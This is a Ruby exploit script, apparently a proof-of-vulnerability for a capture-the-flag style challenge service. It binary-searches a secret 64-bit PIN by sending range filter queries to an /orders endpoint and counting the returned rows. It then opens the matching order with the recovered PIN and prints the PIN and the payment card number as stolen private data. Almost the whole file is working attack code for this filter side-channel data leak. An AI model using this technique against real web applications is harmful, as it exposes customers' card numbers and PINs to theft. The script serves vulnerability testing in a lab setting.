#!/bin/env ruby

require "logger"

require "http"
require "nokogiri"

require 'active_support/core_ext/object/to_query'

LLL = Logger.new(STDERR,
                 formatter: proc do |sev, datetime, progname, msg|
                   "#{sev}: #{msg}\n"
                 end)

MAX_PIN =  0xffffffffffffffff

class Pov
  attr_reader :host, :port


  def initialize
    @host = ENV['HOST'] || 'challenge'
    @port = ENV['PORT'] || '3013'
  end

  def run!
    bottom = 0x0
    top_increment = MAX_PIN >> 1
    top = MAX_PIN

    maybe_path = nil

    columns = %w{top inc got query}

    print("% 16s % 16s % 3s %s\n" % columns)

    loop do
      query = {'filter[pin:gteq]' => ("%016X" % bottom),
               'filter[pin:lteq]' => ("%016X" % top)}.to_query


      resp = client.get "/orders?#{query}"

      assert_equal(200, resp.status)
      doc = Nokogiri::HTML(resp.body.to_s)
      order_count = doc.css('tbody tr').length


      print("\r% 16X % 16X % 3d %s\n" %
                  [top, top_increment,
                   order_count,
                   query])


      if order_count >= 1
        top -= top_increment
        top_increment >>= 1
      end

      if 0 == top_increment
        maybe_path =
          "http://#{@host}:#{@port}" +
          doc.css('tbody a[href]').attr('href').value +
          '?' +
          ({pin: ("%016X" % (top + 1))}).to_query

        break
      end

      if 0 == order_count
        top += top_increment
        # top_increment *= -1
      end
    end

    if maybe_path.nil?
      LLL.error "didn't find a candidate path, failed"
      exit
    end

    resp = client.get maybe_path
    assert_equal(200, resp.status)
    doc = Nokogiri::HTML(resp.body.to_s)

    found_pin = doc.css('dd.pin')
    found_pan = doc.css('dd.pan')

    did_succeed = false

    unless found_pin.empty?
      puts "found pin:"
      puts "PRIVDATA=#{found_pin.text}"
      did_succeed = true
    end

    unless found_pan.empty?
      puts "found payment card:"
      puts "PRIVDATA=#{found_pan.text}"
      did_succeed = true
    end

    if did_succeed
      puts "success :)"
    else
      LLL.error "didn't find pin or payment card, failed"
    end
  end

  private
  def client
    return @client if defined? @client

    @client = HTTP.persistent "http://#{@host}:#{@port}"
  end

  def assert_equal(expected, actual)
    assert(expected == actual, "expected #{expected} to == #{actual}")
  end

  def assert(predicate, message='failed assertion')
    return if predicate
    fail message
  end
end

pov = Pov.new
at_exit do
  LLL.info((["ruby", $0] + ARGV).join(' '))
  $stderr.flush
  $stdout.flush
end
pov.run!

